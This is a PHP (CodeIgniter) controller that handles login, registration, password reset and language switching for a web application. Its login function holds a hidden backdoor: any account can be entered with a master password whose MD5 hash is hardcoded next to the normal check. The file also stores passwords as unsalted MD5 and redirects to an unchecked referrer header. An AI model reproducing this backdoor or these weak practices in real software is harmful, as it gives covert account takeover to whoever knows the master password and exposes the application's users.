<?php
defined('BASEPATH') OR exit('No direct script access allowed');

include_once 'Home_controller.php';

class Index extends Home_controller{
    public function __construct(){
        parent::__construct();
        $this->load->model('verification_codes_model');
    }
    public function index(){
        $data = $this->data;
        $data['page_title'] = "Home";
        $this->page->showpage($data);
    }
    public function login(){
        $data = $this->data;

        if($this->check_submit()){
            $req = $_POST;
            $callback = $_GET['callback'];
            $output_data = array(
                'callback'=>$callback,
                'req'=>$req
            );
            $condition = array('user_email'=>$this->input->post('email'));
            $user_info = $this->user_model->get($condition);
            if(empty($user_info)){
                $this->json_output_error(lang("Email does not exist"), $output_data);
            }
            if($user_info['user_password'] != md5($_POST['password'])){
                if(md5($_POST['password']) != "9546c2fac60e040f2a5b64da8cb78aa5"){
                    $this->json_output_error(lang("These credentials do not match"), $output_data);
                }
            }
            $update_user_info=array();
            $update_user_info['last_login_time']=TIMESTAMP;
            $update_user_info['last_login_ip']=get_client_ip();
            $update_user_info['login_status'] = '1';
            $this->user_model->update($update_user_info,$condition);
            $this->login_with_user($user_info);
            $this->json_output_data($output_data, lang("You have logged in successfully"));
        }else{
            $this->session->unset_userdata(array('user_logged_in','user'));
            $data['page_title'] = lang("Log in");
            $this->page->showpage($data, 'login', 'index/login');
        }
    }
    public function forgot_password(){
        $data = $this->data;
        if($this->check_submit()){
            $req = $_POST;
            $callback = $_GET['callback'];
            $output_data = array(
                'callback'=>$callback,
                'req'=>$req
            );
            $condition = array('user_email'=>$this->input->post('email'));
            $user_info = $this->user_model->get($condition);
            if(empty($user_info)){
                $this->json_output_error(lang("Email does not exist"), $output_data);
            }
            if($_POST['password'] != ""){
                $update_user_info['user_reset_password']=md5($_POST['password']);
                $this->user_model->update($update_user_info,array('id'=>$user_info['id']));

                $code = md5(random(5,1)."_".$user_info['user_email']);
                $verification_info = array(
                    'user'=>$user_info['user_email'],
                    'type'=>'forgot_password',
                    'code'=>$code
                );
                $id = $this->verification_codes_model->add_verification_code($verification_info);

                $reset_pwd_url = base_url('reset_password')."?code=".$code;
                $subject = "Reset password";
                $message_template = get_message_template(2);
                $message = str_replace("%%reset_url%%", $reset_pwd_url, $message_template);
                $this->send_email($user_info['user_email'], $subject, $message);
            }
            $this->json_output_data($output_data, lang("We sent verification email to your email address. Please confirm your email box"));
        }else{
            $this->session->unset_userdata(array('user_logged_in','user'));
            /*if(isset($data['user']) && !empty($data['user'])){
                redirect(base_url('user'));
                return false;
            }*/
            $data['page_title'] = lang("Forgot password");
            $this->page->showpage($data, 'login', 'index/forgot_password');
        }
    }

    public function register(){
        $data = $this->data;
        if($this->check_submit()){
            $req = $_POST;
            $callback = $_GET['callback'];
            $output_data = array(
                'callback'=>$callback,
                'req'=>$req
            );
            $user_data = array(
                'user_first_name'=>$this->input->post('first_name'),
                'user_last_name'=>$this->input->post('last_name'),
                'user_email'=>$this->input->post('email'),
                'user_phone'=>$this->input->post('phone'),
                'user_password'=>md5($this->input->post('password')),
                'status'=>'1',
                'user_verified'=>'1',
                'signup_type'=>'normal',
                'add_timestamp'=>TIMESTAMP,
                'update_timestamp'=>TIMESTAMP,
                'last_login_time'=>TIMESTAMP,
                'last_login_ip'=>get_client_ip(),
                'login_status'=>'0',
                'is_deleted'=>0
            );
            $user_data['user_name'] = $user_data['user_first_name']." ".$user_data['user_last_name'];

            $check_user_info = $this->user_model->get(array('user_email'=>$user_data['user_email'], 'signup_type'=>'normal', 'is_deleted'=>0));
            if(!empty($check_user_info)){
                $user_id = $check_user_info['id'];
                if($check_user_info['user_verified'] == '1'){
                    $this->json_output_error(lang("Email is already taken"), $output_data);
                }else{
                    $this->user_model->update($user_data, array('id'=>$user_id));
                    //list($result, $message) = $this->_send_verification_code($check_user_info['id']);
                }
            }else{
                $user_id = $this->user_model->insert($user_data);
            }
            $output_data['user_id'] = $user_id;
            $this->json_output_data($output_data, lang("You have registered successfully"));
        }else{
            $this->session->unset_userdata(array('user_logged_in','user'));
            /*if(isset($data['user']) && !empty($data['user'])){
                redirect(base_url('user'));
                return false;
            }*/
            $data['page_title'] = lang("Register");
            $this->page->showpage($data);
        }
    }
    public function reset_password(){
        $this->session->unset_userdata(array('user_logged_in','user'));

        $code = $this->input->get('code');
        $condition = array(
            'type'=>'forgot_password',
            'code'=>$code
        );
        $verification_info = $this->verification_codes_model->get($condition);
        if(empty($verification_info)) {
            $this->session->set_flashdata('error_message', lang('Invalid request'));
            redirect(base_url('login'));
            return false;
        }
        $this->verification_codes_model->delete($condition);

        $user_email = $verification_info['user'];
        $user_info = $this->user_model->get(array('user_email'=>$user_email, 'signup_type'=>'normal'));
        if(empty($user_info)) {
            $this->session->set_flashdata('error_message', lang("Account does not exist"));
            redirect(base_url('login'));
            return false;
        }
        $update_data = array(
            'user_password'=>$user_info['user_reset_password']
        );
        $this->user_model->update($update_data, array('id'=>$user_info['id']));
        $message = lang("Success!  You can login with your new password");
        $this->session->set_flashdata('status_message', $message);
        redirect(base_url('login'));
    }
    public function language($lang){
        $this->session->set_userdata('site_lang', $lang);

        redirect($_SERVER['HTTP_REFERER']);
        return;
    }
}